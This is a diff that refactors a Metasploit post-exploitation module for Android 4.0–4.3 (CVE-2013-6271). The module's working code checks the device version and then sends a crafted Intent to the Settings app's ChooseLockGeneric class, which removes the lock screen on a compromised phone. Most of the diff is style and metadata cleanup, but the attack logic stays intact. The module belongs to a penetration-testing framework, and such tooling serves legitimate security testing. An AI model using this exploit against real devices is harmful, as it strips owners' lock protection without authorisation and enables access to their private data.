@@ -1,9 +1,7 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-
-require 'msf/core'
 
 class MetasploitModule < Msf::Post
   Rank = NormalRanking
@@ -11,33 +9,46 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Common
   include Msf::Post::Android::System
 
-  def initialize(info={})
-    super( update_info( info, {
-        'Name'          => "Android Settings Remove Device Locks (4.0-4.3)",
-        'Description'   => %q{
-            This module exploits a bug in the Android 4.0 to 4.3 com.android.settings.ChooseLockGeneric class.
-            Any unprivileged app can exploit this vulnerability to remove the lockscreen.
-            A logic flaw / design error exists in the settings application that allows an Intent from any
-            application to clear the screen lock. The user may see that the Settings application has crashed,
-            and the phone can then be unlocked by a swipe.
-            This vulnerability was patched in Android 4.4.
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Android Settings Remove Device Locks (4.0-4.3)',
+        'Description' => %q{
+          This module exploits a bug in the Android 4.0 to 4.3 com.android.settings.ChooseLockGeneric class.
+          Any unprivileged app can exploit this vulnerability to remove the lockscreen.
+          A logic flaw / design error exists in the settings application that allows an Intent from any
+          application to clear the screen lock. The user may see that the Settings application has crashed,
+          and the phone can then be unlocked by a swipe.
+          This vulnerability was patched in Android 4.4.
         },
-        'License'       => MSF_LICENSE,
-        'Author'        => [
-            'CureSec', # discovery
-            'timwr'    # metasploit module
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'CureSec', # discovery
+          'timwr' # metasploit module
         ],
-        'References'    =>
-        [
-            [ 'CVE', '2013-6271' ],
-            [ 'URL', 'http://blog.curesec.com/article/blog/26.html' ],
-            [ 'URL', 'http://www.curesec.com/data/advisories/Curesec-2013-1011.pdf' ]
+        'References' => [
+          [ 'CVE', '2013-6271' ],
+          [ 'URL', 'http://blog.curesec.com/article/blog/26.html' ],
+          [ 'URL', 'http://www.curesec.com/data/advisories/Curesec-2013-1011.pdf' ]
         ],
-        'SessionTypes'  => [ 'meterpreter', 'shell' ],
-        'Platform'       => 'android',
-        'DisclosureDate' => "Oct 11 2013"
-      }
-    ))
+        'SessionTypes' => [ 'meterpreter', 'shell' ],
+        'Platform' => 'android',
+        'DisclosureDate' => '2013-10-11',
+        'Notes' => {
+          'Stability' => [CRASH_SERVICE_DOWN],
+          'SideEffects' => [CONFIG_CHANGES, SCREEN_EFFECTS],
+          'Reliability' => []
+        },
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              android_*
+            ]
+          }
+        }
+      )
+    )
   end
 
   def is_version_compat?
@@ -49,8 +60,8 @@ class MetasploitModule < Msf::Post
       fail_with(Failure::Unknown, 'Failed to retrieve build.prop, you might need to try again.')
     end
 
-    android_version = Gem::Version.new(build_prop['ro.build.version.release'])
-    if android_version <= Gem::Version.new('4.3') && android_version >= Gem::Version.new('4.0')
+    android_version = Rex::Version.new(build_prop['ro.build.version.release'])
+    if android_version <= Rex::Version.new('4.3') && android_version >= Rex::Version.new('4.0')
       return true
     end
 
@@ -59,18 +70,16 @@ class MetasploitModule < Msf::Post
 
   def run
     unless is_version_compat?
-      print_error("This module is only compatible with Android versions 4.0 to 4.3")
+      print_error('This module is only compatible with Android versions 4.0 to 4.3')
       return
     end
 
     result = session.android.activity_start('intent:#Intent;launchFlags=0x8000;component=com.android.settings/.ChooseLockGeneric;i.lockscreen.password_type=0;B.confirm_credentials=false;end')
     if result.nil?
-      print_good("Intent started, the lock screen should now be a dud.")
-      print_good("Go ahead and manually swipe or provide any pin/password/pattern to continue.")
+      print_good('Intent started, the lock screen should now be a dud.')
+      print_good('Go ahead and manually swipe or provide any pin/password/pattern to continue.')
     else
       print_error("The Intent could not be started: #{result}")
     end
   end
-
 end
-
